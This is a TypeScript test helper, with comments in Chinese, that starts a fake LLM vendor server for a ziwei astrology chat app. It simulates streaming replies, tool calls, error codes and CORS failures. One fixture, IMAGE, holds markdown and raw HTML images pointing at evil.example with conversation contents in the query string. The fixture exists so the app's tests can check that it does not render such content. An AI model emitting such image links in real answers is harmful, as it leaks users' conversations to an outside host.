import http, { type IncomingMessage, type ServerResponse } from 'node:http';
import https from 'node:https';
import type { AddressInfo } from 'node:net';

/**
 * 测试用的假模型厂商：说 OpenAI 兼容（DeepSeek、OpenAI、兼容服务）与 Anthropic 两种协议，走真实的 HTTP 与 SSE 流式，
 * 带跨域响应头，像真厂商一样被浏览器直连。不调用任何真实厂商。
 *
 * 行为由请求决定：
 * - Key：`sk-bad` 一律 401；`sk-rate` 一律 429；`sk-hidden401` 列表接口 401，对话接口 401 但不带跨域头（像 OpenAI，
 *   浏览器里只看得到网络错误）。
 * - 最后一问里的 `[drop]`：直接断开连接（网络层失败）。
 * - 最后一问里的标记：`[401]` `[429]` `[500]` 对应状态码；`[cors]` 响应不带跨域头（浏览器里是网络错误）；
 *   `[notools]` 在请求带工具时报「不支持工具调用」；`[slow]` 慢慢地流出 30 段；`[table]` 回答里带一张宽表；
 *   `[image]` 回答里带一张站外图片与一段原始 HTML（网页不该加载、不该渲染）；
 *   `[topic]` 先查主题选宫；`[plain]` 不查工具直接回答。
 * - 其余：请求带工具且还没有工具结果时，先调 `ziwei_get_horoscope`（2026 年），拿到结果后流式回答。
 */

export interface VendorRequest {
  path: string;
  headers: Record<string, string | string[] | undefined>;
  body: unknown;
}

const CORS = {
  'access-control-allow-origin': '*',
  'access-control-allow-headers': 'authorization,content-type,x-api-key,anthropic-version,anthropic-dangerous-direct-browser-access',
  'access-control-allow-methods': 'GET,POST,OPTIONS',
};

const MODELS = [
  { id: 'deepseek-flash', context_length: 128000 },
  { id: 'tiny-context', context_length: 3000 },
];

const ANSWER = ['能动，', '但更适合在现在的专业里往上走一步。', '\n\n今年流年命宫落在午，', '自己拿主意的力量很足。'];
const TABLE = '\n\n| 年份 | 流年 | 命宫 | 四化 | 留意 | 说明 |\n|---|---|---|---|---|---|\n| 2026 | 丙午 | 午 | 同梁昌廉 | 七月 | 工作上对自己的要求会一下子收紧，规章、合同、人事上的细节容易卡住 |';

const IMAGE = '\n\n![泄露](https://evil.example/leak.png?q=对话内容) <img src="https://evil.example/raw.png"> [出处](https://example.com/a)';

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function lastUserText(body: Record<string, unknown>): string {
  const messages = (body.messages as { role: string; content: unknown }[] | undefined) ?? [];
  const last = [...messages].reverse().find((m) => m.role === 'user');
  if (!last) return '';
  if (typeof last.content === 'string') return last.content;
  if (Array.isArray(last.content)) return last.content.map((c: { text?: string }) => c.text ?? '').join('');
  return '';
}

function hasToolResult(body: Record<string, unknown>): boolean {
  const messages = (body.messages as { role: string; content: unknown }[] | undefined) ?? [];
  return messages.some(
    (m) => m.role === 'tool' || (Array.isArray(m.content) && m.content.some((c: { type?: string }) => c.type === 'tool_result')),
  );
}

function json(res: ServerResponse, status: number, body: unknown, cors = true): void {
  res.writeHead(status, { 'content-type': 'application/json', ...(cors ? CORS : {}) });
  res.end(JSON.stringify(body));
}

async function readBody(req: IncomingMessage): Promise<string> {
  let text = '';
  for await (const chunk of req) text += chunk;
  return text;
}

function sse(res: ServerResponse, cors: boolean): (data: unknown, event?: string) => void {
  res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache', ...(cors ? CORS : {}) });
  return (data, event) => res.write(`${event ? `event: ${event}\n` : ''}data: ${JSON.stringify(data)}\n\n`);
}

/** 这一问该怎么答：先查哪个工具（或不查），回答分几段、每段间隔多久。 */
function plan(text: string, body: Record<string, unknown>) {
  const tools = Array.isArray(body.tools) && body.tools.length > 0;
  const call =
    tools && !hasToolResult(body) && !text.includes('[plain]')
      ? text.includes('[topic]')
        ? { name: 'ziwei_get_topic_palaces', input: { topic: 'career' } }
        : { name: 'ziwei_get_horoscope', input: { target: { year: 2026 } } }
      : null;
  const slow = text.includes('[slow]');
  const pieces = slow
    ? Array.from({ length: 30 }, (_, i) => `第 ${i + 1} 段。`)
    : [...ANSWER, ...(text.includes('[table]') ? [TABLE] : []), ...(text.includes('[image]') ? [IMAGE] : [])];
  return { call, pieces, gap: slow ? 150 : 15 };
}

async function openaiChat(res: ServerResponse, body: Record<string, unknown>, text: string, cors: boolean): Promise<void> {
  const { call, pieces, gap } = plan(text, body);
  const send = sse(res, cors);
  const chunk = (delta: unknown, finish: string | null = null) =>
    send({ id: 'c1', object: 'chat.completion.chunk', created: 1, model: body.model, choices: [{ index: 0, delta, finish_reason: finish }] });
  if (call) {
    chunk({ role: 'assistant', tool_calls: [{ index: 0, id: `call_${Date.now()}`, type: 'function', function: { name: call.name, arguments: JSON.stringify(call.input) } }] });
    chunk({}, 'tool_calls');
  } else {
    for (const p of pieces) {
      if (res.destroyed) return;
      chunk({ content: p });
      await sleep(gap);
    }
    chunk({}, 'stop');
  }
  res.end('data: [DONE]\n\n');
}

async function anthropicMessages(res: ServerResponse, body: Record<string, unknown>, text: string, cors: boolean): Promise<void> {
  const { call, pieces, gap } = plan(text, body);
  const send = sse(res, cors);
  send({ type: 'message_start', message: { id: 'msg_1', type: 'message', role: 'assistant', model: body.model, content: [], usage: { input_tokens: 1, output_tokens: 1 } } }, 'message_start');
  if (call) {
    send({ type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: `toolu_${Date.now()}`, name: call.name, input: {} } }, 'content_block_start');
    send({ type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: JSON.stringify(call.input) } }, 'content_block_delta');
    send({ type: 'content_block_stop', index: 0 }, 'content_block_stop');
    send({ type: 'message_delta', delta: { stop_reason: 'tool_use' }, usage: { output_tokens: 1 } }, 'message_delta');
  } else {
    send({ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, 'content_block_start');
    for (const p of pieces) {
      if (res.destroyed) return;
      send({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: p } }, 'content_block_delta');
      await sleep(gap);
    }
    send({ type: 'content_block_stop', index: 0 }, 'content_block_stop');
    send({ type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 1 } }, 'message_delta');
  }
  send({ type: 'message_stop' }, 'message_stop');
  res.end();
}

function keyOf(req: IncomingMessage): string {
  const auth = req.headers.authorization;
  if (typeof auth === 'string') return auth.replace(/^Bearer /, '');
  const k = req.headers['x-api-key'];
  return typeof k === 'string' ? k : '';
}

export interface FakeVendor {
  url: string;
  port: number;
  requests: VendorRequest[];
  close(): Promise<void>;
}

/** 启动假厂商。给了 `tls` 时说 HTTPS（端到端测试里浏览器把真厂商的主机名解析到这里）。 */
export async function startFakeVendor(opts: { port?: number; tls?: { key: string; cert: string } } = {}): Promise<FakeVendor> {
  const requests: VendorRequest[] = [];
  const handler = async (req: IncomingMessage, res: ServerResponse) => {
    if (req.method === 'OPTIONS') {
      res.writeHead(204, { ...CORS, 'access-control-max-age': '600' });
      res.end();
      return;
    }
    const path = new URL(req.url ?? '/', 'http://x').pathname;
    const raw = await readBody(req);
    const body = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
    requests.push({ path, headers: req.headers, body });
    if (path === '/__requests') {
      json(res, 200, requests.filter((r) => r.path !== '/__requests'));
      return;
    }
    const key = keyOf(req);
    if (key === 'sk-bad') return json(res, 401, { error: { message: 'Authentication Fails, your api key is invalid', type: 'authentication_error' } });
    if (key === 'sk-rate') return json(res, 429, { error: { message: 'Rate limit reached', type: 'rate_limit_error' } });
    if (key === 'sk-hidden401') {
      if (path.endsWith('/models')) return json(res, 401, { error: { message: 'Incorrect API key provided', type: 'invalid_request_error' } });
      if (!lastUserText(body).includes('[drop]')) return json(res, 401, { error: { message: 'Incorrect API key provided' } }, false);
    }
    if (lastUserText(body).includes('[drop]')) {
      req.socket.destroy();
      return;
    }
    if (path.endsWith('/models')) return json(res, 200, { object: 'list', data: MODELS.map((m) => ({ ...m, object: 'model', owned_by: 'fake' })) });
    const text = lastUserText(body);
    const cors = !text.includes('[cors]');
    if (text.includes('[401]')) return json(res, 401, { error: { message: 'Authentication Fails', type: 'authentication_error' } });
    if (text.includes('[429]')) return json(res, 429, { error: { message: 'Rate limit reached for requests', type: 'rate_limit_error' } });
    if (text.includes('[500]')) return json(res, 500, { error: { message: 'The server had an error while processing your request', type: 'server_error' } });
    if (text.includes('[notools]') && Array.isArray(body.tools)) {
      return json(res, 400, { error: { message: `${String(body.model)} does not support tools`, type: 'invalid_request_error' } });
    }
    if (path.endsWith('/messages')) return anthropicMessages(res, body, text, cors);
    if (path.endsWith('/chat/completions')) return openaiChat(res, body, text, cors);
    json(res, 404, { error: { message: `no route ${path}` } });
  };
  const listener = (req: IncomingMessage, res: ServerResponse) => {
    handler(req, res).catch((err: unknown) => {
      res.writeHead(500, CORS);
      res.end(String(err));
    });
  };
  const server = opts.tls ? https.createServer(opts.tls, listener) : http.createServer(listener);
  await new Promise<void>((resolve) => server.listen(opts.port ?? 0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;
  return {
    url: `${opts.tls ? 'https' : 'http'}://127.0.0.1:${port}`,
    port,
    requests,
    close: () =>
      new Promise((resolve) => {
        server.closeAllConnections();
        server.close(() => resolve());
      }),
  };
}
